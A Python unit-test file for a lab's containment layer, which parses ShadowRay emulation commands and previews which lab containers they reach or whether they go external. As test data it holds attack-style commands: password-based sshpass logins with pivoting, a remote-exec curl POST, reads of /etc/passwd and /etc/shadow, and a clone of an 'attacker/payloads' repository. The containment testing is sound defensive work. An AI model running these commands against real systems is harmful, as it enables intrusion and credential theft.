"""Unit tests for the command-destination parser (task 4.1) and the
command/destination preview (task 4.6).

These are example-based unit tests (the property tests for the containment core
are tasks 4.3/4.5 and live elsewhere). They pin down concrete behaviour:

Parser (``command_parser``):
1. ``ssh`` / ``sshpass ... user@host`` extract the host with the user stripped.
2. ``curl`` / ``wget`` extract http(s) URLs (reduced to host/IP) and ``host:port``.
3. Nested double-``ssh`` yields BOTH the outer and inner hosts.
4. ``git clone`` extracts the remote host.
5. Purely-local commands (``whoami``, ``cat /etc/passwd``, ``echo '...'``) yield
   no destinations. ``Destination.value`` / ``kind`` / ``raw`` are asserted.

Preview (``preview``):
6. The preview resolves internal destination IPs to their lab container
   (172.21.0.20 -> nginx; nested -> nginx + db) and builds a ``target_label``
   like ``"nginx (172.21.0.20)"``.
7. An external destination (``nmap.org``) sets ``has_external`` at every level.
8. Purely-local commands are represented with a ``local_target`` (no crash on an
   empty destination list).
9. Both raw-dict abilities and object-like abilities are accepted.

A couple of examples reuse the real curated ShadowRay commands (read-only) so the
tests track the shapes the containment core will actually see.

_Requisitos: 6.5, 6.2_
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.services.containment.command_parser import (
    CommandDestinations,
    Destination,
    DestinationKind,
    extract_destinations,
    parse_command,
)
from app.services.containment.preview import (
    DEFAULT_LOCAL_TARGET,
    AbilityPreview,
    EmulationPreview,
    build_ability_preview,
    preview_abilities,
    preview_ability,
    preview_commands,
)
from app.services.containment.subnet_validator import (
    DestinationClass,
    validate_commands,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _values(parsed: CommandDestinations) -> set[str]:
    """Set of destination ``value`` strings for concise membership asserts."""
    return {dest.value for dest in parsed.destinations}


def _load_shadowray_abilities() -> list[dict]:
    """Load the real curated ShadowRay abilities from sticks/data (read-only)."""
    here = Path(__file__).resolve()
    # tests/ -> backend/ -> pipeline_ui/ -> repo root -> sticks/data/api/...
    repo_root = here.parents[3]
    path = repo_root / "sticks" / "data" / "api" / "shadowray_dag-ability.json"
    return json.loads(path.read_text(encoding="utf-8"))


# ===========================================================================
# PARSER — destination extraction
# ===========================================================================


# --- 1. ssh / sshpass user@host --------------------------------------------


def test_ssh_extracts_host_with_user_stripped() -> None:
    """``ssh user@host`` yields the host only; ``value`` drops the user, ``raw``
    keeps the ``user@host`` token."""
    parsed = parse_command("ssh attacker@172.21.0.20 'whoami'")
    assert len(parsed.destinations) == 1
    dest = parsed.destinations[0]
    assert dest.value == "172.21.0.20"
    assert dest.kind is DestinationKind.IP
    assert dest.raw == "attacker@172.21.0.20"
    assert parsed.is_local is False


def test_sshpass_user_at_host_extracts_internal_ip() -> None:
    """A real ShadowRay-style ``sshpass ... user@host`` extracts the host IP."""
    parsed = parse_command(
        "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'whoami'"
    )
    assert _values(parsed) == {"172.21.0.20"}
    dest = next(d for d in parsed.destinations if d.value == "172.21.0.20")
    assert dest.kind is DestinationKind.IP
    assert dest.raw == "attacker@172.21.0.20"


def test_ssh_to_external_hostname_is_a_host_kind() -> None:
    """``ssh user@hostname`` yields a HOST-kind destination (no DNS)."""
    parsed = parse_command("ssh deploy@build.example.com 'uptime'")
    assert len(parsed.destinations) == 1
    dest = parsed.destinations[0]
    assert dest.value == "build.example.com"
    assert dest.kind is DestinationKind.HOST
    assert dest.raw == "deploy@build.example.com"


# --- 2. curl / wget: URLs and host:port ------------------------------------


def test_curl_https_url_reduced_to_host() -> None:
    """``curl https://host/path`` reduces the URL to its host; kind URL, raw is
    the full URL token."""
    parsed = parse_command("curl https://downloads.example.org/tool.sh")
    assert len(parsed.destinations) == 1
    dest = parsed.destinations[0]
    assert dest.value == "downloads.example.org"
    # The parser reduces a URL to its host and classifies by the host form
    # (hostname => HOST). ``raw`` keeps the scheme+host (path/port stripped).
    assert dest.kind is DestinationKind.HOST
    assert dest.raw == "https://downloads.example.org"


def test_curl_http_url_with_ip_host_and_port() -> None:
    """A ShadowRay ``curl ... http://IP:port/exec`` reduces to the bare IP."""
    parsed = parse_command("curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec")
    assert len(parsed.destinations) == 1
    dest = parsed.destinations[0]
    assert dest.value == "172.21.0.20"
    # URL reduced to a bare IP host => IP kind; raw keeps scheme+host:port.
    assert dest.kind is DestinationKind.IP
    assert dest.raw == "http://172.21.0.20:5055"


def test_wget_external_url_is_host_kind() -> None:
    """``wget https://nmap.org/...`` extracts the external hostname (HOST kind)."""
    parsed = parse_command("wget https://nmap.org/dist/nmap-7.98.tgz")
    assert len(parsed.destinations) == 1
    dest = parsed.destinations[0]
    assert dest.value == "nmap.org"
    # Host reduced from the URL => HOST kind; raw is scheme+host (path stripped).
    assert dest.kind is DestinationKind.HOST
    assert dest.raw == "https://nmap.org"


# --- 3. Nested double-ssh (both inner + outer hosts) -----------------------


def test_nested_double_ssh_yields_both_hosts() -> None:
    """The real ShadowRay T1016 nested ssh reaches BOTH 172.21.0.20 (outer) and
    172.22.0.20 (inner)."""
    command = (
        "sshpass -p 'Passw0rd' ssh -T -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null attacker@172.21.0.20 "
        "'ip -brief a; ip r; ip neigh; hostname -I; "
        'sshpass -p "Passw0rd" ssh -T -o StrictHostKeyChecking=no '
        '-o UserKnownHostsFile=/dev/null attacker@172.22.0.20 '
        '"ip -brief a; ip r; ip neigh; hostname -I"\''
    )
    parsed = parse_command(command)
    assert {"172.21.0.20", "172.22.0.20"} <= _values(parsed)


# --- 4. git clone ----------------------------------------------------------


def test_git_clone_https_extracts_remote_host() -> None:
    parsed = parse_command("git clone https://github.com/attacker/payloads.git")
    assert len(parsed.destinations) == 1
    dest = parsed.destinations[0]
    assert dest.value == "github.com"
    # URL reduced to its hostname => HOST kind; raw is scheme+host (path stripped).
    assert dest.kind is DestinationKind.HOST
    assert dest.raw == "https://github.com"


def test_git_clone_scp_style_user_at_host() -> None:
    """``git clone user@host:path`` (scp-style) extracts the host."""
    parsed = parse_command("git clone git@gitlab.example.com:group/repo.git")
    assert len(parsed.destinations) == 1
    dest = parsed.destinations[0]
    assert dest.value == "gitlab.example.com"
    assert dest.kind is DestinationKind.HOST
    assert dest.raw == "git@gitlab.example.com"


# --- 5. Purely-local commands => empty -------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "whoami",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "echo 'mining crypto'",
        "echo \"END OF SHADOWRAY\"",
        "id",
        "hostname -I",
    ],
)
def test_purely_local_commands_have_no_destinations(command: str) -> None:
    """Local commands yield an empty destination list and ``is_local`` True.
    _Requisitos: 6.2_"""
    parsed = parse_command(command)
    assert parsed.destinations == []
    assert parsed.is_local is True
    assert parsed.command == command


def test_extract_destinations_batches_in_order() -> None:
    """``extract_destinations`` returns one result per input, in order."""
    commands = [
        "whoami",
        "curl http://172.21.0.20:5055/exec",
        "wget https://nmap.org/dist/nmap.tgz",
    ]
    results = extract_destinations(commands)
    assert [r.command for r in results] == commands
    assert results[0].is_local is True
    assert _values(results[1]) == {"172.21.0.20"}
    assert _values(results[2]) == {"nmap.org"}


# ===========================================================================
# PREVIEW — command assembly with resolved target containers
# ===========================================================================


# --- 6. Internal IP resolves to its lab container --------------------------


def test_preview_resolves_internal_ip_to_nginx_container() -> None:
    """172.21.0.20 resolves to the ``nginx`` container with a
    ``"nginx (172.21.0.20)"`` label."""
    preview = preview_commands(
        ["curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"],
        ability_id="0fa06c9c-fd66-52f1-b94a-83cb37bee900",
        ability_name="T1190 - Exploit Public-Facing Application",
    )
    assert isinstance(preview, AbilityPreview)
    assert preview.ability_id == "0fa06c9c-fd66-52f1-b94a-83cb37bee900"
    assert len(preview.commands) == 1

    cmd = preview.commands[0]
    assert cmd.is_local is False
    assert cmd.has_external is False
    assert cmd.target_containers == ["nginx"]

    dest = cmd.destinations[0]
    assert dest.value == "172.21.0.20"
    assert dest.classification is DestinationClass.INTERNAL
    assert dest.container == "nginx"
    assert dest.is_external is False
    assert dest.target_label == "nginx (172.21.0.20)"
    assert cmd.target_labels == ["nginx (172.21.0.20)"]


def test_preview_nested_double_ssh_resolves_nginx_and_db() -> None:
    """The nested ssh (172.21.0.20 -> 172.22.0.20) resolves to nginx AND db."""
    command = (
        "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 "
        "'sshpass -p \"Passw0rd\" ssh attacker@172.22.0.20 \"hostname -I\"'"
    )
    preview = preview_commands([command])
    cmd = preview.commands[0]
    assert cmd.has_external is False
    assert cmd.target_containers == ["nginx", "db"]
    labels = set(cmd.target_labels)
    assert "nginx (172.21.0.20)" in labels
    assert "db (172.22.0.20)" in labels


# --- 7. External destination flags has_external at every level -------------


def test_preview_flags_external_destination() -> None:
    """A ``wget https://nmap.org/...`` sets ``has_external`` on the destination,
    command, ability and full emulation preview, with no lab container."""
    preview = preview_commands(
        ["sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 wget https://nmap.org/dist/nmap-7.98.tgz"],
        ability_id="8130dba3-f51c-57d2-9d49-78e9b0bb3c4b",
        ability_name="T1068 - Exploitation for Privilege Escalation",
    )
    assert preview.has_external is True
    cmd = preview.commands[0]
    assert cmd.has_external is True

    external = [d for d in cmd.destinations if d.is_external]
    assert len(external) == 1
    ext = external[0]
    assert ext.value == "nmap.org"
    assert ext.classification is DestinationClass.EXTERNAL
    assert ext.container is None
    # ``raw`` is the parser-reduced URL (scheme+host, path stripped).
    assert ext.target_label == "destino externo (https://nmap.org)"

    # The internal hop is still resolved alongside the external one.
    assert "nginx" in cmd.target_containers


# --- 8. Local command represented by a local_target (no crash) -------------


def test_preview_local_command_uses_local_target() -> None:
    """A purely-local command has no destination rows but a ``local_target`` so
    the modal always renders a target."""
    preview = preview_commands(["echo 'mining crypto'"])
    cmd = preview.commands[0]
    assert cmd.is_local is True
    assert cmd.has_external is False
    assert cmd.destinations == []
    assert cmd.local_target == DEFAULT_LOCAL_TARGET
    assert cmd.target_containers == []
    # target_labels never returns an empty list, even for a local command.
    assert cmd.target_labels == [DEFAULT_LOCAL_TARGET]


def test_preview_local_command_honours_custom_local_target() -> None:
    """A caller-supplied ``local_target`` is used for local commands."""
    preview = preview_commands(
        ["cat /etc/passwd"],
        local_target="kali (172.20.0.20)",
    )
    cmd = preview.commands[0]
    assert cmd.is_local is True
    assert cmd.local_target == "kali (172.20.0.20)"
    assert cmd.target_labels == ["kali (172.20.0.20)"]


# --- 9. Both raw-dict abilities and object-like abilities ------------------


def test_preview_ability_from_raw_dict() -> None:
    """``preview_ability`` accepts a raw curated JSON dict (executors list)."""
    ability = {
        "ability_id": "0fa06c9c-fd66-52f1-b94a-83cb37bee900",
        "name": "T1190 - Exploit Public-Facing Application",
        "executors": [
            {
                "name": "sh",
                "platform": "linux",
                "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec",
            }
        ],
    }
    preview = preview_ability(ability)
    assert preview.ability_id == "0fa06c9c-fd66-52f1-b94a-83cb37bee900"
    assert preview.ability_name == "T1190 - Exploit Public-Facing Application"
    assert preview.has_external is False
    assert preview.commands[0].target_containers == ["nginx"]


def test_preview_ability_from_object_like() -> None:
    """``preview_ability`` accepts an object exposing ability_id/name/executors."""

    class _Ability:
        ability_id = "8130dba3-f51c-57d2-9d49-78e9b0bb3c4b"
        name = "T1068 - Exploitation for Privilege Escalation"
        executors = [
            {
                "name": "sh",
                "platform": "linux",
                "command": "wget https://nmap.org/dist/nmap-7.98.tgz",
            }
        ]

    preview = preview_ability(_Ability())
    assert preview.ability_id == "8130dba3-f51c-57d2-9d49-78e9b0bb3c4b"
    assert preview.ability_name == "T1068 - Exploitation for Privilege Escalation"
    assert preview.has_external is True
    assert preview.commands[0].destinations[0].value == "nmap.org"


def test_preview_ability_with_no_executors_has_no_commands() -> None:
    """An ability with no executors previews to an empty, non-external ability."""

    class _Ability:
        ability_id = "empty"
        name = "Empty"
        executors: list = []

    preview = preview_ability(_Ability())
    assert preview.commands == []
    assert preview.has_external is False


# --- preview_abilities over a whole (mixed) Operation ----------------------


def test_preview_abilities_mixed_operation_flags_external_and_flattens() -> None:
    """A mix of internal, local and external abilities: the emulation preview
    flags external overall and flattens all command previews."""
    abilities = [
        {
            "ability_id": "a-internal",
            "name": "Internal",
            "executors": [
                {"command": "curl http://172.20.0.10:5055/exec"},
            ],
        },
        {
            "ability_id": "a-local",
            "name": "Local",
            "executors": [{"command": "echo 'mining crypto'"}],
        },
        {
            "ability_id": "a-external",
            "name": "External",
            "executors": [{"command": "wget https://nmap.org/dist/nmap.tgz"}],
        },
    ]
    emulation = preview_abilities(abilities)
    assert isinstance(emulation, EmulationPreview)
    assert emulation.has_external is True
    assert len(emulation.abilities) == 3
    # Flattened commands: one per ability here.
    assert len(emulation.commands) == 3
    # caldera resolved for 172.20.0.10.
    internal_cmd = emulation.abilities[0].commands[0]
    assert internal_cmd.target_containers == ["caldera"]
    # Local ability represented by a local target row.
    local_cmd = emulation.abilities[1].commands[0]
    assert local_cmd.is_local is True
    assert local_cmd.target_labels == [DEFAULT_LOCAL_TARGET]


def test_build_ability_preview_reuses_a_shared_report() -> None:
    """``build_ability_preview`` builds a preview from an existing task-4.2 report
    so the pre-flight and the preview can share one parse+classify pass."""
    report = validate_commands(
        ["curl http://172.21.0.20:5055/exec"],
        ability_id="shared",
        ability_name="Shared",
    )
    preview = build_ability_preview(report)
    assert isinstance(preview, AbilityPreview)
    assert preview.ability_id == "shared"
    assert preview.commands[0].target_containers == ["nginx"]


# --- Real curated ShadowRay abilities end-to-end through the preview -------


def test_preview_real_shadowray_operation() -> None:
    """Previewing all real ShadowRay abilities resolves the internal containers,
    keeps every destination contained, and handles local commands."""
    abilities = _load_shadowray_abilities()
    emulation = preview_abilities(abilities)

    # The curated dataset no longer downloads from nmap.org; every network
    # destination belongs to the contained 172.20/21/22 lab.
    assert emulation.has_external is False
    external_abilities = [a for a in emulation.abilities if a.has_external]
    assert external_abilities == []

    # nginx (172.21.0.20) shows up as a resolved target somewhere in the preview.
    all_containers = {
        c for a in emulation.abilities for cmd in a.commands for c in cmd.target_containers
    }
    assert "nginx" in all_containers
    # The nested T1016 ability also reaches db (172.22.0.20).
    assert "db" in all_containers

    # Local abilities (T1496.001 'echo', END OF SHADOWRAY 'echo') render a local
    # target instead of crashing on an empty destination list.
    local_previews = [
        cmd
        for a in emulation.abilities
        for cmd in a.commands
        if cmd.is_local
    ]
    assert local_previews  # at least the two echo-only abilities
    assert all(cmd.target_labels == [DEFAULT_LOCAL_TARGET] for cmd in local_previews)
